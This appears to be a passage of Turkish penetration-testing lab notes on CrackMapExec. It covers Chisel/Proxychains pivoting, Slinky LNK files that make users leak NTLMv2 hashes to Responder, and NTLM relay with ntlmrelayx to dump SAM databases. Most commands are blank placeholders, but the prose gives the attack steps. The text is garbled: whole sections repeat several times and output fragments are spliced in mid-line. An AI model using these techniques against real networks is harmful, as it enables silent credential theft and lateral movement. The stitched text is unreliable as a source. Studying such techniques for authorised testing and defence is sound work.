### Attack Host Üzerinde Chisel'i Kapatma

{{CODE_BLOCK_108}}


### Sunucu olarak Windows ve Client olarak Linux

Chisel'i Windows workstation'da bir sunucu olarak başlatarak ve saldırı hostumuzu client olarak kullanarak bunun tersini de yapabiliriz. Chisel'i sunucu olarak başlatmak için `server --socks5` seçeneğini kullanacağız.


### Chisel'i Hedef Makinede Sunucu Olarak Başlatma

{{CODE_BLOCK_109}}

Şimdi hedef makinemiz Chisel sunucusuna bağlanmak ve proxy'yi etkinleştirmek için IP ve porttan sonra `socks` seçeneğini kullanmamız gerekiyor.


### Attack Hostumuzdan Chisel Sunucusuna Bağlanma

{{CODE_BLOCK_110}}

Şimdi Proxychains'i tekrar kullanabiliriz:

### Internal Network'e Bağlanmak için Proxy Chain'i Kullanma

{{CODE_BLOCK_111}}

Bu bölümde, **attack host** üzerinde **Proxychains** ve **Chisel** yapılandırmayı ve **CrackMapExec** kullanarak hedef makinede **Chisel** çalıştırmayı öğrendik.

İlerleyen bölümlerde, diğer ağlara ulaşmak için `CrackMapExec` ve `Proxychains` kullanacağız.

---

### Stealing Hashes

Yeni hesapları ele geçirmek için kullanılan en yaygın tekniklerden biri parola hashlerinin çalınmasıdır. Bunu başarmanın farklı yöntemleri vardır, ancak yaygın olanı, bir bilgisayarı veya kullanıcıyı kontrol ettiğimiz sahte bir paylaşılan klasörle bir kimlik doğrulama işlemi başlatmaya zorlamaktır.

Bu kimlik doğrulama işlemini başlatırken, kullanıcı veya bilgisayar bunu bir NTLMv2 hash'i ile yapar. Bu hash, Hashcat gibi bir araç kullanılarak kırılabilir veya kimlik bilgilerini bilmeden kullanıcının kimliğine bürünmek için başka bir bilgisayara iletilebilir.

Paylaşılan klasörleri kullanarak hash'leri çalmak için bir kısayol oluşturabilir ve kısayolda görünen simge sahte paylaşılan klasörümüzü gösterecek şekilde yapılandırabiliriz. Kullanıcı paylaşılan klasöre girdiğinde, simgenin konumunu aramaya çalışacak ve paylaşılan klasörümüze karşı kimlik doğrulamasını zorlayacaktır.

NTLMv2 hash'lerini toplama hakkında daha fazla bilgi edinmek için RedTeam Ekipler için [Farming blogunu okuyabiliriz: MDsec'ten NetNTLM hasadı](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/), sadece kısayolların kullanımını değil, aynı amaca hizmet eden diğer dosya türlerini de gösterir.


### Slinky Modülü

`Slinky`, [@byt3bl33d3r](https://twitter.com/byt3bl33d3r) tarafından oluşturulan bir modüldür ve CME'deki en heyecan verici modüllerden biridir. Prensip basittir. Modül, yazma izinlerine sahip tüm paylaşımlarda belirtilen SMB sunucusuna bir UNC yolu içeren simge attribute'a sahip Windows kısayolları oluşturur. Birisi paylaşımı ziyaret ettiğinde, simge attribute'u sunucumuza giden bir UNC yolu içerdiği için `Responder` kullanarak NTLMv2 hash'ini alacağız.

Modülün `SERVER` ve `NAME` olmak üzere iki zorunlu seçeneği ve bir isteğe bağlı `CLEANUP` seçeneği vardır.


### Slinky Module Options

{{CODE_BLOCK_112}}

`SERVER`, kontrol ettiğimiz SMB sunucusunun IP'sine ve UNC yolunun işaret etmesini istediğimiz yere karşılık gelir. `NAME` seçeneği kısayol dosyasına bir isim atar, `CLEANUP` ise işimiz bittiğinde kısayolu silmek içindir.


### Chisel kullanarak bağlama

Bu alıştırma için lokal erişimi simüle edeceğiz ve internal ağa bağlanmak için Chisel ve Proxychains kullanacağız. Chisel zaten hedef makinemizde bir sunucu olarak çalışıyor ve bir client olarak bağlanmamız ve daha sonra internal ağı numaralandırmak için proxychains kullanmamız gerekiyor. Chisel kullanarak bağlanmak için aşağıdaki komutu **kullanalım**


### Hedef Makine Chisel Sunucusuna Bağlanma

{{CODE_BLOCK_113}}


### NTLMv2 Hash'lerinin Çalınması
İlk olarak, `--shares` seçeneğini kullanarak `grace` kullanıcısının `WRITE` ayrıcalıklarına sahip olduğu bir paylaşım bulalım:

### WRITE Ayrıcalıklarına Sahip Paylaşımları Bulma

{{CODE_BLOCK_114}}


Gördüğümüz gibi, `grace` `HR` ve `IT-Tools` paylaşımlarına yazabilir. Bu nedenle her bir paylaşıma bir `LNK` dosyası yazmak için `Slinky` modülünü kullanabiliriz. 

**SERVER=10.10.14.33** seçeneğini kullanarak **attack host**'umuzun **tun0** ağındaki **IP adresini** belirteceğiz ve **NAME=important** seçeneğiyle **LNK dosyasına atanacak dosya adını** belirleyeceğiz.


### Using Slinky

{{CODE_BLOCK_115}}


![Pasted image 20241202171933.png](/img/user/resimler/Pasted%20image%2020241202171933.png)

**Not:** **CrackMapExec**, genellikle **`OpSec` açısından güvenli** olarak kabul edilir çünkü tüm işlemler ya **`bellekte` çalıştırılır**, ya **`WinAPI` çağrılarıyla ağ üzerinden sorgulanır**, ya da **Windows'un built-in araçları/özellikleri** kullanılarak gerçekleştirilir.

Bu gereksinimleri karşılamayan bir modül çalıştırmaya çalıştığımızda, **önceden bir uyarı alırız**. **`Slinky`** modülü, **OpSec açısından güvenli olmayan** bir modüle örnektir. Devam etmeden önce **bir uyarı alacağız**.

LNK dosyası oluşturulduktan sonra, Responder'ı çalıştırmamız ve birinin paylaşıma göz atmasını beklememiz gerekir. 


### Starting Responder

{{CODE_BLOCK_116}}

Not: Hash'i yakalamak için `Responder.conf` dosyasında SMB seçeneği `On` olmalıdır.

NTLMv2 hash'imizi aldık ve hesabı kullanmak için onu kırmamız gerekiyor veya bir `NTLM Relay` yapabiliriz. Bunu kırmak için, `ASREPRoast` ve `Kerberoasting` ile yaptığımız gibi `Hashcat mod 5600`'ü kullanabiliriz. `NTLM Relay`'e odaklanalım.


### **NTLM Relay**

Diğer bir çözüm ise NTLMv2 hash'ini doğrudan `SMB Sign`'nın devre dışı bırakıldığı ağdaki diğer sunuculara ve workstation'lara iletmektir. SMB Sign çok önemlidir çünkü bir bilgisayarda SMB Sign etkinse, saldırı hostumuzun kimliğini kanıtlayamayacağımız için o bilgisayara relay yapamayız. SMB Sign'nın devre dışı bırakıldığı hedeflerin bir listesini almak için `--gen-relay-list` seçeneğini kullanabiliriz.

Şimdi Proxychains'i kullanabilir ve SMB Sign devre dışı bırakılmış makinelerin bir listesini alabiliriz

### Getting Relay List

{{CODE_BLOCK_117}}


**`ntlmrelayx`** aracını, daha önce **`--gen-relay-list`** seçeneğiyle elde ettiğimiz listeyle birlikte kullanacağız.

Hedef makinede **local administrator** ayrıcalıklarına sahip bir hesap bulursak ve ek seçenekler belirtmezsek, **`ntlmrelayx`** otomatik olarak hedef makinenin **`SAM` database**'ini dump edecektir. Bu sayede, herhangi bir **local admin kullanıcısının hash'leriyle** bir **`pass-the-hash attack`** gerçekleştirmeyi deneyebiliriz.

### Execute NTLMRelayX

{{CODE_BLOCK_118}}

Bir kullanıcının **SMB share**'ine erişmesini beklemeliyiz. **LNK dosyamız**, kullanıcının hedef makinemize bağlanmasını zorlar (**bu işlem arka planda gerçekleşir ve kullanıcı herhangi bir anormallik fark etmez**).

Bu gerçekleştiğinde, **`ntlmrelayx`** konsolunda aşağıdakine benzer bir çıktı görmeliyiz:

{{CODE_BLOCK_119}}

Ardından, administrator hash'ini kullanarak hedef makinede kimlik doğrulaması yapmak için crackmapexec'i kullanabiliriz:

### Local Hesapları Test Etme

{{CODE_BLOCK_120}}

### Her Şeyi Temizleyin

Modülü kullandıktan sonra, **LNK dosyasını temizlemek** için **`-o CLEANUP=YES`** seçeneğini ve **LNK dosyasının adını** (**`NAME=important`**) belirtmek kritik önem taşır.

### Cleanup

{{CODE_BLOCK_121}}, 'netlogon', 'sysvol']
SPIDER_P... 10.129.203.121 445 DC01 [*] EXT:
['ico', 'lnk']
SPIDER_P... 10.129.203.121 445 DC01 [*] SIZE: 51200
SPIDER_P... 10.129.203.121 445 DC01 [*] OUTPUT:
/tmp/cme_spider_plus
```

Dizine gidebilir ve kullanıcının erişebileceği tüm dosyaların bir listesini alabiliriz:


### Kullanıcının Kullanabileceği Dosyaları Listeleme

{{CODE_BLOCK_94}}

Eğer paylaşımın tüm içeriğini indirmek istiyorsak `READ_ONLY=false` seçeneğini aşağıdaki gibi kullanabiliriz:

{{CODE_BLOCK_95}}

{{CODE_BLOCK_96}}

Not: Sabırlı olmamız gerekiyor. Paylaşılan klasör ve dosya sayısına bağlı olarak işlem birkaç dakika sürebilir

`spider_plus` modülü için mevcut tüm seçenekleri görüntülemek için `--options` seçeneğini kullanabiliriz:


### Spider_plus Options

{{CODE_BLOCK_97}}

Bir sonraki bölümde CrackMapExec'in bir `proxy` aracılığıyla diğer ağlara ulaşmak için nasıl kullanılacağı anlatılacaktır.


---

### Proxychains with CME

### Scenario

İnternal bir Pentest üzerinde çalışıyoruz. Bir ağ taraması gerçekleştirdik ve yalnızca bir host (10.129.204.133) tespit edip ele geçirebildik. Ele geçirilen bu host üzerinde `ipconfig` çalıştırdığımızda, iki ağ bağdaştırıcısı olduğunu fark ettik. ARP tablosu `172.16.1.10` IP adresine sahip başka bir hostu gösteriyor. Topladığımız bilgilere dayanarak aşağıdaki senaryoya sahibiz:

![Pasted image 20241202141946.png](/img/user/resimler/Pasted%20image%2020241202141946.png)

DC01'e ve bu ağdaki (172.16.1.0/24) herhangi bir makineye saldırmak için, saldırı hostumuz ile MS01 arasında bir `tünel` kurmalıyız. Bu nedenle, CME tarafından yürütülen tüm komutlar MS01 üzerinden geçer.


### Set Up the Tunnel

Tünelimizi kurmak için [Chisel](https://github.com/jpillora/chisel) kullanacağız. [Release](https://github.com/jpillora/chisel/releases)'e gidelim ve saldıracağımız makinemiz için en son Windows binary'sini ve saldırı hostumuzda kullanmak için en yeni Linux binary'sini indirelim ve aşağıdaki adımları gerçekleştirelim:

*  Chisel'ı Saldırı Hostumuza indirin ve Çalıştırın:

### Chisel - Reverse Tunnel

{{CODE_BLOCK_98}}


*  Chisel for Windows'u İndirin ve Hedef Host'a Yükleyin:


### Upload Chisel

{{CODE_BLOCK_99}}


* CrackMapExec komut yürütme seçeneği `-x`'i kullanarak Chisel sunucumuza bağlanmak için `chisel.exe` dosyasını çalıştırın (Bu seçeneği Komut Yürütme bölümünde daha fazla tartışacağız)


### Connect to the Chisel Server

{{CODE_BLOCK_100}}

Bu terminaldeki komut, hedef makinadaki **Chisel** process'ini durdurana kadar çalışmaya devam edecektir. Bunu bu bölümde daha sonra yapacağız.

**Attack host** üzerinde, **Chisel server** çıktısında **bir client bağlantısı aldığımızı ve tüneli başlattığımızı** gösteren yeni bir satır görmeliyiz.

### Chisel Receiving Session No. 1

{{CODE_BLOCK_101}}

TCP 1080 portunun dinlenip dinlenmediğini kontrol ederek de tünelin çalıştığını doğrulayabiliriz:


### Check Listening Port

{{CODE_BLOCK_102}}

* Proxyychains'i Chisel varsayılan portu `TCP 1080`'i kullanacak şekilde yapılandırmamız gerekir. Yapılandırma dosyasının ProxyList bölümüne `socks5 127.0.0.1 1080`'i aşağıdaki gibi eklediğimizden emin olmamız gerekiyor:


### Configure Proxychains

{{CODE_BLOCK_103}}

* Artık 172.16.1.10 IP'sine ulaşmak için `Proxychains` aracılığıyla CrackMapExec'i kullanabiliriz:

### CrackMapExec'in Proxychains ile Test Edilmesi

{{CODE_BLOCK_104}}


Proxychains çıktısını konsoldan kaldırmak için `Proxychains4` ve `quiet -q` seçeneğini kullanabiliriz:

### Quiet Seçeneği ile Proxychains4

{{CODE_BLOCK_105}}

Proxychains aracılığıyla herhangi bir CME işlemi gerçekleştirebiliriz.


### Killing Chisel on the Target Machine

İşimiz bittiğinde, Chisel process'ini kill etmemiz gerekir. Bunu yapmak için, PowerShell komutlarını yürütmek için `-X` seçeneğini kullanacağız ve PowerShell komutunu çalıştıracağız `Stop-Process - Name chisel -Force .` Komut yürütme konusunu Komut Yürütme bölümünde daha ayrıntılı olarak ele alacağız.


### Kill the Chisel Client

{{CODE_BLOCK_106}}

Bunu yaptıktan sonra, Chisel client komutunu çalıştırdığımız terminal aşağıdaki gibi sonuçlanmalıdır:


### Chisel'i Zorla Durdurduktan Sonra Terminalin Kapanması

{{CODE_BLOCK_107}}

Artık saldırı konağımızdaki Chisel sunucusunu CTRL + C ile kapatabiliriz.


### Attack Host Üzerinde Chisel'i Kapatma

{{CODE_BLOCK_108}}


### Sunucu olarak Windows ve Client olarak Linux

Chisel'i Windows workstation'da bir sunucu olarak başlatarak ve saldırı hostumuzu client olarak kullanarak bunun tersini de yapabiliriz. Chisel'i sunucu olarak başlatmak için `server --socks5` seçeneğini kullanacağız.


### Chisel'i Hedef Makinede Sunucu Olarak Başlatma

{{CODE_BLOCK_109}}

Şimdi hedef makinemiz Chisel sunucusuna bağlanmak ve proxy'yi etkinleştirmek için IP ve porttan sonra `socks` seçeneğini kullanmamız gerekiyor.


### Attack Hostumuzdan Chisel Sunucusuna Bağlanma

{{CODE_BLOCK_110}}

Şimdi Proxychains'i tekrar kullanabiliriz:

### Internal Network'e Bağlanmak için Proxy Chain'i Kullanma

{{CODE_BLOCK_111}}

Bu bölümde, **attack host** üzerinde **Proxychains** ve **Chisel** yapılandırmayı ve **CrackMapExec** kullanarak hedef makinede **Chisel** çalıştırmayı öğrendik.

İlerleyen bölümlerde, diğer ağlara ulaşmak için `CrackMapExec` ve `Proxychains` kullanacağız.

---

### Stealing Hashes

Yeni hesapları ele geçirmek için kullanılan en yaygın tekniklerden biri parola hashlerinin çalınmasıdır. Bunu başarmanın farklı yöntemleri vardır, ancak yaygın olanı, bir bilgisayarı veya kullanıcıyı kontrol ettiğimiz sahte bir paylaşılan klasörle bir kimlik doğrulama işlemi başlatmaya zorlamaktır.

Bu kimlik doğrulama işlemini başlatırken, kullanıcı veya bilgisayar bunu bir NTLMv2 hash'i ile yapar. Bu hash, Hashcat gibi bir araç kullanılarak kırılabilir veya kimlik bilgilerini bilmeden kullanıcının kimliğine bürünmek için başka bir bilgisayara iletilebilir.

Paylaşılan klasörleri kullanarak hash'leri çalmak için bir kısayol oluşturabilir ve kısayolda görünen simge sahte paylaşılan klasörümüzü gösterecek şekilde yapılandırabiliriz. Kullanıcı paylaşılan klasöre girdiğinde, simgenin konumunu aramaya çalışacak ve paylaşılan klasörümüze karşı kimlik doğrulamasını zorlayacaktır.

NTLMv2 hash'lerini toplama hakkında daha fazla bilgi edinmek için RedTeam Ekipler için [Farming blogunu okuyabiliriz: MDsec'ten NetNTLM hasadı](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/), sadece kısayolların kullanımını değil, aynı amaca hizmet eden diğer dosya türlerini de gösterir.


### Slinky Modülü

`Slinky`, [@byt3bl33d3r](https://twitter.com/byt3bl33d3r) tarafından oluşturulan bir modüldür ve CME'deki en heyecan verici modüllerden biridir. Prensip basittir. Modül, yazma izinlerine sahip tüm paylaşımlarda belirtilen SMB sunucusuna bir UNC yolu içeren simge attribute'a sahip Windows kısayolları oluşturur. Birisi paylaşımı ziyaret ettiğinde, simge attribute'u sunucumuza giden bir UNC yolu içerdiği için `Responder` kullanarak NTLMv2 hash'ini alacağız.

Modülün `SERVER` ve `NAME` olmak üzere iki zorunlu seçeneği ve bir isteğe bağlı `CLEANUP` seçeneği vardır.


### Slinky Module Options

{{CODE_BLOCK_112}}

`SERVER`, kontrol ettiğimiz SMB sunucusunun IP'sine ve UNC yolunun işaret etmesini istediğimiz yere karşılık gelir. `NAME` seçeneği kısayol dosyasına bir isim atar, `CLEANUP` ise işimiz bittiğinde kısayolu silmek içindir.


### Chisel kullanarak bağlama

Bu alıştırma için lokal erişimi simüle edeceğiz ve internal ağa bağlanmak için Chisel ve Proxychains kullanacağız. Chisel zaten hedef makinemizde bir sunucu olarak çalışıyor ve bir client olarak bağlanmamız ve daha sonra internal ağı numaralandırmak için proxychains kullanmamız gerekiyor. Chisel kullanarak bağlanmak için aşağıdaki komutu **kullanalım**


### Hedef Makine Chisel Sunucusuna Bağlanma

{{CODE_BLOCK_113}}


### NTLMv2 Hash'lerinin Çalınması
İlk olarak, `--shares` seçeneğini kullanarak `grace` kullanıcısının `WRITE` ayrıcalıklarına sahip olduğu bir paylaşım bulalım:

### WRITE Ayrıcalıklarına Sahip Paylaşımları Bulma

{{CODE_BLOCK_114}}


Gördüğümüz gibi, `grace` `HR` ve `IT-Tools` paylaşımlarına yazabilir. Bu nedenle her bir paylaşıma bir `LNK` dosyası yazmak için `Slinky` modülünü kullanabiliriz. 

**SERVER=10.10.14.33** seçeneğini kullanarak **attack host**'umuzun **tun0** ağındaki **IP adresini** belirteceğiz ve **NAME=important** seçeneğiyle **LNK dosyasına atanacak dosya adını** belirleyeceğiz.


### Using Slinky

{{CODE_BLOCK_115}}


![Pasted image 20241202171933.png](/img/user/resimler/Pasted%20image%2020241202171933.png)

**Not:** **CrackMapExec**, genellikle **`OpSec` açısından güvenli** olarak kabul edilir çünkü tüm işlemler ya **`bellekte` çalıştırılır**, ya **`WinAPI` çağrılarıyla ağ üzerinden sorgulanır**, ya da **Windows'un built-in araçları/özellikleri** kullanılarak gerçekleştirilir.

Bu gereksinimleri karşılamayan bir modül çalıştırmaya çalıştığımızda, **önceden bir uyarı alırız**. **`Slinky`** modülü, **OpSec açısından güvenli olmayan** bir modüle örnektir. Devam etmeden önce **bir uyarı alacağız**.

LNK dosyası oluşturulduktan sonra, Responder'ı çalıştırmamız ve birinin paylaşıma göz atmasını beklememiz gerekir. 


### Starting Responder

{{CODE_BLOCK_116}}

Not: Hash'i yakalamak için `Responder.conf` dosyasında SMB seçeneği `On` olmalıdır.

NTLMv2 hash'imizi aldık ve hesabı kullanmak için onu kırmamız gerekiyor veya bir `NTLM Relay` yapabiliriz. Bunu kırmak için, `ASREPRoast` ve `Kerberoasting` ile yaptığımız gibi `Hashcat mod 5600`'ü kullanabiliriz. `NTLM Relay`'e odaklanalım.


### **NTLM Relay**

Diğer bir çözüm ise NTLMv2 hash'ini doğrudan `SMB Sign`'nın devre dışı bırakıldığı ağdaki diğer sunuculara ve workstation'lara iletmektir. SMB Sign çok önemlidir çünkü bir bilgisayarda SMB Sign etkinse, saldırı hostumuzun kimliğini kanıtlayamayacağımız için o bilgisayara relay yapamayız. SMB Sign'nın devre dışı bırakıldığı hedeflerin bir listesini almak için `--gen-relay-list` seçeneğini kullanabiliriz.

Şimdi Proxychains'i kullanabilir ve SMB Sign devre dışı bırakılmış makinelerin bir listesini alabiliriz

### Getting Relay List

{{CODE_BLOCK_117}}


**`ntlmrelayx`** aracını, daha önce **`--gen-relay-list`** seçeneğiyle elde ettiğimiz listeyle birlikte kullanacağız.

Hedef makinede **local administrator** ayrıcalıklarına sahip bir hesap bulursak ve ek seçenekler belirtmezsek, **`ntlmrelayx`** otomatik olarak hedef makinenin **`SAM` database**'ini dump edecektir. Bu sayede, herhangi bir **local admin kullanıcısının hash'leriyle** bir **`pass-the-hash attack`** gerçekleştirmeyi deneyebiliriz.

### Execute NTLMRelayX

{{CODE_BLOCK_118}}

Bir kullanıcının **SMB share**'ine erişmesini beklemeliyiz. **LNK dosyamız**, kullanıcının hedef makinemize bağlanmasını zorlar (**bu işlem arka planda gerçekleşir ve kullanıcı herhangi bir anormallik fark etmez**).

Bu gerçekleştiğinde, **`ntlmrelayx`** konsolunda aşağıdakine benzer bir çıktı görmeliyiz:

{{CODE_BLOCK_119}}

Ardından, administrator hash'ini kullanarak hedef makinede kimlik doğrulaması yapmak için crackmapexec'i kullanabiliriz:

### Local Hesapları Test Etme

{{CODE_BLOCK_120}}

### Her Şeyi Temizleyin

Modülü kullandıktan sonra, **LNK dosyasını temizlemek** için **`-o CLEANUP=YES`** seçeneğini ve **LNK dosyasının adını** (**`NAME=important`**) belirtmek kritik önem taşır.

### Cleanup

{{CODE_BLOCK_121}}, 'print

{{CODE_BLOCK_96}}

Not: Sabırlı olmamız gerekiyor. Paylaşılan klasör ve dosya sayısına bağlı olarak işlem birkaç dakika sürebilir

`spider_plus` modülü için mevcut tüm seçenekleri görüntülemek için `--options` seçeneğini kullanabiliriz:


### Spider_plus Options

{{CODE_BLOCK_97}}

Bir sonraki bölümde CrackMapExec'in bir `proxy` aracılığıyla diğer ağlara ulaşmak için nasıl kullanılacağı anlatılacaktır.


---

### Proxychains with CME

### Scenario

İnternal bir Pentest üzerinde çalışıyoruz. Bir ağ taraması gerçekleştirdik ve yalnızca bir host (10.129.204.133) tespit edip ele geçirebildik. Ele geçirilen bu host üzerinde `ipconfig` çalıştırdığımızda, iki ağ bağdaştırıcısı olduğunu fark ettik. ARP tablosu `172.16.1.10` IP adresine sahip başka bir hostu gösteriyor. Topladığımız bilgilere dayanarak aşağıdaki senaryoya sahibiz:

![Pasted image 20241202141946.png](/img/user/resimler/Pasted%20image%2020241202141946.png)

DC01'e ve bu ağdaki (172.16.1.0/24) herhangi bir makineye saldırmak için, saldırı hostumuz ile MS01 arasında bir `tünel` kurmalıyız. Bu nedenle, CME tarafından yürütülen tüm komutlar MS01 üzerinden geçer.


### Set Up the Tunnel

Tünelimizi kurmak için [Chisel](https://github.com/jpillora/chisel) kullanacağız. [Release](https://github.com/jpillora/chisel/releases)'e gidelim ve saldıracağımız makinemiz için en son Windows binary'sini ve saldırı hostumuzda kullanmak için en yeni Linux binary'sini indirelim ve aşağıdaki adımları gerçekleştirelim:

*  Chisel'ı Saldırı Hostumuza indirin ve Çalıştırın:

### Chisel - Reverse Tunnel

{{CODE_BLOCK_98}}


*  Chisel for Windows'u İndirin ve Hedef Host'a Yükleyin:


### Upload Chisel

{{CODE_BLOCK_99}}


* CrackMapExec komut yürütme seçeneği `-x`'i kullanarak Chisel sunucumuza bağlanmak için `chisel.exe` dosyasını çalıştırın (Bu seçeneği Komut Yürütme bölümünde daha fazla tartışacağız)


### Connect to the Chisel Server

{{CODE_BLOCK_100}}

Bu terminaldeki komut, hedef makinadaki **Chisel** process'ini durdurana kadar çalışmaya devam edecektir. Bunu bu bölümde daha sonra yapacağız.

**Attack host** üzerinde, **Chisel server** çıktısında **bir client bağlantısı aldığımızı ve tüneli başlattığımızı** gösteren yeni bir satır görmeliyiz.

### Chisel Receiving Session No. 1

{{CODE_BLOCK_101}}

TCP 1080 portunun dinlenip dinlenmediğini kontrol ederek de tünelin çalıştığını doğrulayabiliriz:


### Check Listening Port

{{CODE_BLOCK_102}}

* Proxyychains'i Chisel varsayılan portu `TCP 1080`'i kullanacak şekilde yapılandırmamız gerekir. Yapılandırma dosyasının ProxyList bölümüne `socks5 127.0.0.1 1080`'i aşağıdaki gibi eklediğimizden emin olmamız gerekiyor:


### Configure Proxychains

{{CODE_BLOCK_103}}

* Artık 172.16.1.10 IP'sine ulaşmak için `Proxychains` aracılığıyla CrackMapExec'i kullanabiliriz:

### CrackMapExec'in Proxychains ile Test Edilmesi

{{CODE_BLOCK_104}}


Proxychains çıktısını konsoldan kaldırmak için `Proxychains4` ve `quiet -q` seçeneğini kullanabiliriz:

### Quiet Seçeneği ile Proxychains4

{{CODE_BLOCK_105}}

Proxychains aracılığıyla herhangi bir CME işlemi gerçekleştirebiliriz.


### Killing Chisel on the Target Machine

İşimiz bittiğinde, Chisel process'ini kill etmemiz gerekir. Bunu yapmak için, PowerShell komutlarını yürütmek için `-X` seçeneğini kullanacağız ve PowerShell komutunu çalıştıracağız `Stop-Process - Name chisel -Force .` Komut yürütme konusunu Komut Yürütme bölümünde daha ayrıntılı olarak ele alacağız.


### Kill the Chisel Client

{{CODE_BLOCK_106}}

Bunu yaptıktan sonra, Chisel client komutunu çalıştırdığımız terminal aşağıdaki gibi sonuçlanmalıdır:


### Chisel'i Zorla Durdurduktan Sonra Terminalin Kapanması

{{CODE_BLOCK_107}}

Artık saldırı konağımızdaki Chisel sunucusunu CTRL + C ile kapatabiliriz.


### Attack Host Üzerinde Chisel'i Kapatma

{{CODE_BLOCK_108}}


### Sunucu olarak Windows ve Client olarak Linux

Chisel'i Windows workstation'da bir sunucu olarak başlatarak ve saldırı hostumuzu client olarak kullanarak bunun tersini de yapabiliriz. Chisel'i sunucu olarak başlatmak için `server --socks5` seçeneğini kullanacağız.


### Chisel'i Hedef Makinede Sunucu Olarak Başlatma

{{CODE_BLOCK_109}}

Şimdi hedef makinemiz Chisel sunucusuna bağlanmak ve proxy'yi etkinleştirmek için IP ve porttan sonra `socks` seçeneğini kullanmamız gerekiyor.


### Attack Hostumuzdan Chisel Sunucusuna Bağlanma

{{CODE_BLOCK_110}}

Şimdi Proxychains'i tekrar kullanabiliriz:

### Internal Network'e Bağlanmak için Proxy Chain'i Kullanma

{{CODE_BLOCK_111}}

Bu bölümde, **attack host** üzerinde **Proxychains** ve **Chisel** yapılandırmayı ve **CrackMapExec** kullanarak hedef makinede **Chisel** çalıştırmayı öğrendik.

İlerleyen bölümlerde, diğer ağlara ulaşmak için `CrackMapExec` ve `Proxychains` kullanacağız.

---

### Stealing Hashes

Yeni hesapları ele geçirmek için kullanılan en yaygın tekniklerden biri parola hashlerinin çalınmasıdır. Bunu başarmanın farklı yöntemleri vardır, ancak yaygın olanı, bir bilgisayarı veya kullanıcıyı kontrol ettiğimiz sahte bir paylaşılan klasörle bir kimlik doğrulama işlemi başlatmaya zorlamaktır.

Bu kimlik doğrulama işlemini başlatırken, kullanıcı veya bilgisayar bunu bir NTLMv2 hash'i ile yapar. Bu hash, Hashcat gibi bir araç kullanılarak kırılabilir veya kimlik bilgilerini bilmeden kullanıcının kimliğine bürünmek için başka bir bilgisayara iletilebilir.

Paylaşılan klasörleri kullanarak hash'leri çalmak için bir kısayol oluşturabilir ve kısayolda görünen simge sahte paylaşılan klasörümüzü gösterecek şekilde yapılandırabiliriz. Kullanıcı paylaşılan klasöre girdiğinde, simgenin konumunu aramaya çalışacak ve paylaşılan klasörümüze karşı kimlik doğrulamasını zorlayacaktır.

NTLMv2 hash'lerini toplama hakkında daha fazla bilgi edinmek için RedTeam Ekipler için [Farming blogunu okuyabiliriz: MDsec'ten NetNTLM hasadı](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/), sadece kısayolların kullanımını değil, aynı amaca hizmet eden diğer dosya türlerini de gösterir.


### Slinky Modülü

`Slinky`, [@byt3bl33d3r](https://twitter.com/byt3bl33d3r) tarafından oluşturulan bir modüldür ve CME'deki en heyecan verici modüllerden biridir. Prensip basittir. Modül, yazma izinlerine sahip tüm paylaşımlarda belirtilen SMB sunucusuna bir UNC yolu içeren simge attribute'a sahip Windows kısayolları oluşturur. Birisi paylaşımı ziyaret ettiğinde, simge attribute'u sunucumuza giden bir UNC yolu içerdiği için `Responder` kullanarak NTLMv2 hash'ini alacağız.

Modülün `SERVER` ve `NAME` olmak üzere iki zorunlu seçeneği ve bir isteğe bağlı `CLEANUP` seçeneği vardır.


### Slinky Module Options

{{CODE_BLOCK_112}}

`SERVER`, kontrol ettiğimiz SMB sunucusunun IP'sine ve UNC yolunun işaret etmesini istediğimiz yere karşılık gelir. `NAME` seçeneği kısayol dosyasına bir isim atar, `CLEANUP` ise işimiz bittiğinde kısayolu silmek içindir.


### Chisel kullanarak bağlama

Bu alıştırma için lokal erişimi simüle edeceğiz ve internal ağa bağlanmak için Chisel ve Proxychains kullanacağız. Chisel zaten hedef makinemizde bir sunucu olarak çalışıyor ve bir client olarak bağlanmamız ve daha sonra internal ağı numaralandırmak için proxychains kullanmamız gerekiyor. Chisel kullanarak bağlanmak için aşağıdaki komutu **kullanalım**


### Hedef Makine Chisel Sunucusuna Bağlanma

{{CODE_BLOCK_113}}


### NTLMv2 Hash'lerinin Çalınması
İlk olarak, `--shares` seçeneğini kullanarak `grace` kullanıcısının `WRITE` ayrıcalıklarına sahip olduğu bir paylaşım bulalım:

### WRITE Ayrıcalıklarına Sahip Paylaşımları Bulma

{{CODE_BLOCK_114}}


Gördüğümüz gibi, `grace` `HR` ve `IT-Tools` paylaşımlarına yazabilir. Bu nedenle her bir paylaşıma bir `LNK` dosyası yazmak için `Slinky` modülünü kullanabiliriz. 

**SERVER=10.10.14.33** seçeneğini kullanarak **attack host**'umuzun **tun0** ağındaki **IP adresini** belirteceğiz ve **NAME=important** seçeneğiyle **LNK dosyasına atanacak dosya adını** belirleyeceğiz.


### Using Slinky

{{CODE_BLOCK_115}}


![Pasted image 20241202171933.png](/img/user/resimler/Pasted%20image%2020241202171933.png)

**Not:** **CrackMapExec**, genellikle **`OpSec` açısından güvenli** olarak kabul edilir çünkü tüm işlemler ya **`bellekte` çalıştırılır**, ya **`WinAPI` çağrılarıyla ağ üzerinden sorgulanır**, ya da **Windows'un built-in araçları/özellikleri** kullanılarak gerçekleştirilir.

Bu gereksinimleri karşılamayan bir modül çalıştırmaya çalıştığımızda, **önceden bir uyarı alırız**. **`Slinky`** modülü, **OpSec açısından güvenli olmayan** bir modüle örnektir. Devam etmeden önce **bir uyarı alacağız**.

LNK dosyası oluşturulduktan sonra, Responder'ı çalıştırmamız ve birinin paylaşıma göz atmasını beklememiz gerekir. 


### Starting Responder

{{CODE_BLOCK_116}}

Not: Hash'i yakalamak için `Responder.conf` dosyasında SMB seçeneği `On` olmalıdır.

NTLMv2 hash'imizi aldık ve hesabı kullanmak için onu kırmamız gerekiyor veya bir `NTLM Relay` yapabiliriz. Bunu kırmak için, `ASREPRoast` ve `Kerberoasting` ile yaptığımız gibi `Hashcat mod 5600`'ü kullanabiliriz. `NTLM Relay`'e odaklanalım.


### **NTLM Relay**

Diğer bir çözüm ise NTLMv2 hash'ini doğrudan `SMB Sign`'nın devre dışı bırakıldığı ağdaki diğer sunuculara ve workstation'lara iletmektir. SMB Sign çok önemlidir çünkü bir bilgisayarda SMB Sign etkinse, saldırı hostumuzun kimliğini kanıtlayamayacağımız için o bilgisayara relay yapamayız. SMB Sign'nın devre dışı bırakıldığı hedeflerin bir listesini almak için `--gen-relay-list` seçeneğini kullanabiliriz.

